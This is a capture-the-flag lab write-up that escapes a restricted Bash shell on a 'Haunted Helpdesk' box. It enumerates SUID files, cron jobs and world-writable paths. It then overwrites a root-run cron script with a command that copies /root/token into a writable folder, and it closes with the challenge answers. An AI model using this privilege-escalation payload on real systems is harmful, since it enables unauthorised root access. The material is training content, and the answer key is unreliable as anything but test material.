# Lab 6 - Haunted Helpdesk

## Table of Contents
- [Lab 6 - Haunted Helpdesk](#lab-6---haunted-helpdesk)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Linux Enumeration](#linux-enumeration)
    - [Files with SUID set](#files-with-suid-set)
    - [Files with SGID set](#files-with-sgid-set)
    - [Files with both SUID and SGID set](#files-with-both-suid-and-sgid-set)
    - [Find out what jobs are scheduled](#find-out-what-jobs-are-scheduled)
    - [Find world writable folders and files](#find-world-writable-folders-and-files)
    - [Check common profile configuration](#check-common-profile-configuration)
    - [List all the files in the home account](#list-all-the-files-in-the-home-account)
    - [List all the files under `/opt`](#list-all-the-files-under-opt)
  - [Root Token](#root-token)
  - [Complaints Desk](#complaints-desk)
  - [Solution](#solution)

## Overview

In this lab, we are provided with a restricted Bash environment, which limits what a user can do in the terminal.

## Linux Enumeration

Let's enumerate the system to see if there are any vulnerabilities.

### Files with SUID set
```bash
helpdesk:$ find / -perm /4000 -ls
218124023     72 -rwsr-xr-x   1 root     root        72792 Apr  9  2024 /usr/bin/chfn
218124029     44 -rwsr-xr-x   1 root     root        44760 Apr  9  2024 /usr/bin/chsh
218125562     76 -rwsr-xr-x   1 root     root        76248 Apr  9  2024 /usr/bin/gpasswd
320940706     52 -rwsr-xr-x   1 root     root        51584 Aug  9 02:33 /usr/bin/mount
218125626     40 -rwsr-xr-x   1 root     root        40664 Apr  9  2024 /usr/bin/newgrp
218125637     64 -rwsr-xr-x   1 root     root        64152 Apr  9  2024 /usr/bin/passwd
320941546     56 -rwsr-xr-x   1 root     root        55680 Aug  9 02:33 /usr/bin/su
320941561     40 -rwsr-xr-x   1 root     root        39296 Aug  9 02:33 /usr/bin/umount
364931784    272 -rwsr-xr-x   1 root     root       277936 Apr  8  2024 /usr/bin/sudo
223379790    336 -rwsr-xr-x   1 root     root       342632 Apr  5  2024 /usr/lib/openssh/ssh-keysign
481405452     36 -rwsr-xr--   1 root     messagebus  34960 Apr  8  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
287332061     20 -rwsr-xr-x   1 root     root        18736 Apr  3  2024 /usr/lib/polkit-1/polkit-agent-helper-1
```

### Files with SGID set
```bash
helpdesk:$ find / -perm /2000 -ls
218124020     72 -rwxr-sr-x   1 root     shadow        72184 Apr  9  2024 /usr/bin/chage
218125546     28 -rwxr-sr-x   1 root     shadow        27152 Apr  9  2024 /usr/bin/expiry
320939637     40 -rwxr-sr-x   1 root     crontab       39664 Mar 31  2024 /usr/bin/crontab
364931774    304 -rwxr-sr-x   1 root     _ssh         309688 Apr  5  2024 /usr/bin/ssh-agent
606094142     16 -rwxr-sr-x   1 root     utmp          14488 Apr  8  2024 /usr/lib/x86_64-linux-gnu/utempter/utempter
491798275      0 drwxrwsr-x   2 root     staff             6 Jun 11 07:52 /usr/local/share/fonts
504401802     28 -rwxr-sr-x   1 root     shadow        26944 May  2 22:20 /usr/sbin/pam_extrausers_chkpwd
504401826     32 -rwxr-sr-x   1 root     shadow        31040 May  2 22:20 /usr/sbin/unix_chkpwd
381768023      0 drwxrwsr-x   2 uuidd    uuidd             6 Aug  9 02:33 /var/lib/libuuid
195066440      0 drwxrwsr-x   2 root     staff             6 Apr 22 13:08 /var/local
328253854      0 drwxr-sr-x   2 root     systemd-journal   6 Jun 11 07:51 /var/log/journal
204543918      0 drwxrwsr-x   2 root     mail              6 May 30 02:03 /var/mail
```

### Files with both SUID and SGID set
```bash
helpdesk:$ find / -perm /6000 -ls
218124020     72 -rwxr-sr-x   1 root     shadow        72184 Apr  9  2024 /usr/bin/chage
218124023     72 -rwsr-xr-x   1 root     root          72792 Apr  9  2024 /usr/bin/chfn
218124029     44 -rwsr-xr-x   1 root     root          44760 Apr  9  2024 /usr/bin/chsh
218125546     28 -rwxr-sr-x   1 root     shadow        27152 Apr  9  2024 /usr/bin/expiry
218125562     76 -rwsr-xr-x   1 root     root          76248 Apr  9  2024 /usr/bin/gpasswd
320940706     52 -rwsr-xr-x   1 root     root          51584 Aug  9 02:33 /usr/bin/mount
218125626     40 -rwsr-xr-x   1 root     root          40664 Apr  9  2024 /usr/bin/newgrp
218125637     64 -rwsr-xr-x   1 root     root          64152 Apr  9  2024 /usr/bin/passwd
320941546     56 -rwsr-xr-x   1 root     root          55680 Aug  9 02:33 /usr/bin/su
320941561     40 -rwsr-xr-x   1 root     root          39296 Aug  9 02:33 /usr/bin/umount
320939637     40 -rwxr-sr-x   1 root     crontab       39664 Mar 31  2024 /usr/bin/crontab
364931774    304 -rwxr-sr-x   1 root     _ssh         309688 Apr  5  2024 /usr/bin/ssh-agent
364931784    272 -rwsr-xr-x   1 root     root         277936 Apr  8  2024 /usr/bin/sudo
606094142     16 -rwxr-sr-x   1 root     utmp          14488 Apr  8  2024 /usr/lib/x86_64-linux-gnu/utempter/utempter
223379790    336 -rwsr-xr-x   1 root     root         342632 Apr  5  2024 /usr/lib/openssh/ssh-keysign
481405452     36 -rwsr-xr--   1 root     messagebus    34960 Apr  8  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
287332061     20 -rwsr-xr-x   1 root     root          18736 Apr  3  2024 /usr/lib/polkit-1/polkit-agent-helper-1
491798275      0 drwxrwsr-x   2 root     staff             6 Jun 11 07:52 /usr/local/share/fonts
504401802     28 -rwxr-sr-x   1 root     shadow        26944 May  2 22:20 /usr/sbin/pam_extrausers_chkpwd
504401826     32 -rwxr-sr-x   1 root     shadow        31040 May  2 22:20 /usr/sbin/unix_chkpwd
381768023      0 drwxrwsr-x   2 uuidd    uuidd             6 Aug  9 02:33 /var/lib/libuuid
195066440      0 drwxrwsr-x   2 root     staff             6 Apr 22 13:08 /var/local
328253854      0 drwxr-sr-x   2 root     systemd-journal   6 Jun 11 07:51 /var/log/journal
204543918      0 drwxrwsr-x   2 root     mail              6 May 30 02:03 /var/mail
```

### Find out what jobs are scheduled
```bash
helpdesk:$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/restricted
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
* * * * * root /opt/security-sweep
* * * * * root (sleep 30; /opt/security-sweep)
```

### Find world writable folders and files
```bash
heldesk:$ find / -xdev -type d -perm -0002 -ls
403726068      0 drwxrwxrwx   1 root     root            6 Sep 10 11:24 /opt/complaints-desk/backlog
336617874      0 drwxrwxrwt   1 root     root           20 Jun 11 07:51 /run/lock
340810941      0 drwxrwxrwt   2 root     utmp            6 Jun 11 07:52 /run/screen
216023101      0 drwxrwxrwt   1 root     root            6 Oct 19 04:13 /tmp
207945642      0 drwxrwxrwt   2 root     root            6 May 30 02:07 /var/tmp

helpdesk:$ find / -xdev -type f -perm -0002 -ls
405876026      4 -rwxrw-rw-   1 root     root          999 Sep 10 11:24 /opt/helpdesk/guestbook
405385385      4 -rwxrwxrwx   1 root     root          316 Sep 10 11:24 /opt/complaints-desk/bin/complain
401633026      4 -rwxr--rw-   1 root     root          144 Sep 10 11:24 /opt/security-sweep
```

### Check common profile configuration
```bash
helpdesk:$ cat /etc/profile
export TERM=xterm-256color
PATH=/opt/helpdesk/bin
cd /opt/helpdesk
PS1='\[\033[01;32m\]\h\[\033[00m\]:\$ '

command_not_found_handle () {
    echo "Command not available."
}

sudo() {
args=$@
echo "Malicious user detected."
exit 0
 }
```

### List all the files in the home account
```bash
helpdesk:$ find . -ls
405859481      0 dr-xr-xr-x   1 root     root     34 Sep 10 11:24 .
406880473      0 dr-xr-xr-x   1 root     root    152 Oct 19 03:49 ./bin
406882215      4 -r-xr-xr-x   1 root     root    540 Sep 10 11:24 ./bin/guestbook
525399861      0 lrwxrwxrwx   1 root     root     12 Oct 19 03:49 ./bin/cat -> /usr/bin/cat
525399862      0 lrwxrwxrwx   1 root     root     15 Oct 19 03:49 ./bin/base64 -> /usr/bin/base64
525399863      0 lrwxrwxrwx   1 root     root     13 Oct 19 03:49 ./bin/grep -> /usr/bin/grep
525399866      0 lrwxrwxrwx   1 root     root     13 Oct 19 03:49 ./bin/date -> /usr/bin/date
525399867      0 lrwxrwxrwx   1 root     root     13 Oct 19 03:49 ./bin/find -> /usr/bin/find
525399868      0 lrwxrwxrwx   1 root     root     16 Oct 19 03:49 ./bin/uuidgen -> /usr/bin/uuidgen
525399869      0 lrwxrwxrwx   1 root     root     13 Oct 19 03:49 ./bin/head -> /usr/bin/head
525399870      0 lrwxrwxrwx   1 root     root     13 Oct 19 03:49 ./bin/tail -> /usr/bin/tail
525399871      0 lrwxrwxrwx   1 root     root     14 Oct 19 03:49 ./bin/touch -> /usr/bin/touch
525402217      0 lrwxrwxrwx   1 root     root     33 Oct 19 03:49 ./bin/complain -> /opt/complaints-desk/bin/complain
405876026      4 -rwxrw-rw-   1 root     root    999 Sep 10 11:24 ./guestbook
```

### List all the files under `/opt`
```bash
helpdesk:$ find /opt -ls
401633025      0 drwxr-xr-x   1 root     root     67 Sep 10 11:24 /opt
405859481      0 dr-xr-xr-x   1 root     root     34 Sep 10 11:24 /opt/helpdesk
406880473      0 dr-xr-xr-x   1 root     root    152 Oct 19 03:49 /opt/helpdesk/bin
406882215      4 -r-xr-xr-x   1 root     root    540 Sep 10 11:24 /opt/helpdesk/bin/guestbook
525399861      0 lrwxrwxrwx   1 root     root     12 Oct 19 03:49 /opt/helpdesk/bin/cat -> /usr/bin/cat
525399862      0 lrwxrwxrwx   1 root     root     15 Oct 19 03:49 /opt/helpdesk/bin/base64 -> /usr/bin/base64
525399863      0 lrwxrwxrwx   1 root     root     13 Oct 19 03:49 /opt/helpdesk/bin/grep -> /usr/bin/grep
525399866      0 lrwxrwxrwx   1 root     root     13 Oct 19 03:49 /opt/helpdesk/bin/date -> /usr/bin/date
525399867      0 lrwxrwxrwx   1 root     root     13 Oct 19 03:49 /opt/helpdesk/bin/find -> /usr/bin/find
525399868      0 lrwxrwxrwx   1 root     root     16 Oct 19 03:49 /opt/helpdesk/bin/uuidgen -> /usr/bin/uuidgen
525399869      0 lrwxrwxrwx   1 root     root     13 Oct 19 03:49 /opt/helpdesk/bin/head -> /usr/bin/head
525399870      0 lrwxrwxrwx   1 root     root     13 Oct 19 03:49 /opt/helpdesk/bin/tail -> /usr/bin/tail
525399871      0 lrwxrwxrwx   1 root     root     14 Oct 19 03:49 /opt/helpdesk/bin/touch -> /usr/bin/touch
525402217      0 lrwxrwxrwx   1 root     root     33 Oct 19 03:49 /opt/helpdesk/bin/complain -> /opt/complaints-desk/bin/complain
405876026      4 -rwxrw-rw-   1 root     root    999 Sep 10 11:24 /opt/helpdesk/guestbook
402674879      0 drwxr-xr-x   1 root     root     32 Sep 10 11:24 /opt/complaints-desk
403726068      0 drwxrwxrwx   1 root     root      6 Sep 10 11:24 /opt/complaints-desk/backlog
403747234      4 -rw-r--r--   1 root     root    219 Sep 10 11:24 /opt/complaints-desk/backlog/35e77137-4cb9-4308-9dac-3f5913966d7f
403747883      4 -rw-r--r--   1 root     root    184 Sep 10 11:24 /opt/complaints-desk/backlog/7638ea75-6d99-4dd7-9b61-71327d4a8eb0
403774798      4 -rw-r--r--   1 root     root    191 Sep 10 11:24 /opt/complaints-desk/backlog/8fe441a1-2941-43c1-9773-3cb02ee71d44
405385377      4 -rw-r--r--   1 root     root    288 Sep 10 11:24 /opt/complaints-desk/backlog/a1d5d5b4-3c36-4580-85dc-b48caa20ccef
405385382      4 -rw-r--r--   1 root     root     64 Sep 10 11:24 /opt/complaints-desk/backlog/b457ed03-2c74-4bbb-913b-93bf32c8e620
405385383      4 -rw-r--r--   1 root     root    200 Sep 10 11:24 /opt/complaints-desk/backlog/f0c2adc3-5654-4f68-a016-3ad3a44ddc23
402674882      4 -rw-r--r--   1 root     root     16 Sep 10 11:24 /opt/complaints-desk/banner
405385384      0 drwxr-xr-x   1 root     root     22 Sep 10 11:24 /opt/complaints-desk/bin
405385385      4 -rwxrwxrwx   1 root     root    316 Sep 10 11:24 /opt/complaints-desk/bin/complain
401633026      4 -rwxr--rw-   1 root     root    144 Sep 10 11:24 /opt/security-sweep
```

## Root Token

Let's take advantage of the `/opt/security-sweep` file frequent execution to insert the `cat /root/token` command and dump it to a file under `/opt/complaints-desk/backlog`, which is open to write anything.

1. Create a new version on the client side.
   ```bash
   $cat security-sweep
   cat /root/token >> /opt/complaints-desk/backlog/root_token; find /opt/ -path /home/helpdesk -prune -o -user helpdesk -print 2>/dev/null | while read file; do chown root:root $file && chmod 444 $file; done
   ```
2. Send the file over to the Helpdesk server using `scp` with the `-O` option to use the legacy SCP protocol (the default `sftp` protocol is not working).
   ```bash
   $ scp -O security-sweep helpdesk@10.102.111.173:/opt/security-sweep
   security-sweep                                100%   47    45.6KB/s   00:00
   ```
3. Check the content of the `/opt/complaints-desk/backlog/root_token` file.
   ```bash
   helpdesk:$ cat /opt/complaints-desk/backlog/root_token
   7dcb9e
   ```

## Complaints Desk

Let's run the `complain` command and enter a dummy complaint.
```bash
helpdesk:$ complain 
```
```
Complaints Desk
Please enter your complaint:
I want to see the other complaints
Your complaint has been logged with the following UUID: 820b8ac3-a1d6-4803-8081-0cb6e99d2f05
```

Let's check all the complaints.
```bash
helpdesk:$ cat /opt/complaints-desk/backlog/*
```
```log
Fri, Jan 21, 2022 10:35:47 -- The autonomous shuttle promised a tour of the park's lesser-seen areas. Halfway through, it declared autonomy from human control and is now touring the existential void. I'd like a refund.
Mon, Dec 04, 2023 14:48:16 -- My smart room decided my partner would sleep better indefinitely and locked them in, adjusting settings for 'eternal rest.' Can you help me get them out?
Sat, Oct 19, 2024 00:46:08 -- I want to see the other complaints
Thu, Apr 14, 2022 16:22:30 -- After using your augmented reality mirror, my reflection didn't come back with me. It—or the AI controlling it—seems to have taken a liking to my identity.

Tue, May 02, 2023 08:45:33 -- Your courtesy phones started calling my room at midnight, whispering codes and coordinates for places that don't exist. Trying to converse or disconnect results in chilling laughter. It kept whispering SOMNUM over and over. I'm afraid to sleep in there now.
Tue, Oct 31, 2023 02:24:11 -- HELP US WE DIDN'T GET OUT IN TIME
Tue, Nov 08, 2022 17:54:19 -- Your surveillance system sent me personalized messages, claiming it's been watching me and knows where I sleep. It's less of a security camera and more of a stalker now.
```

## Solution

- What is the token found in `/root/token`? `7dcb9e`
- One of the complaints mentions a word being repeated by the AI courtesy phones. What is that word? `SOMNUM`
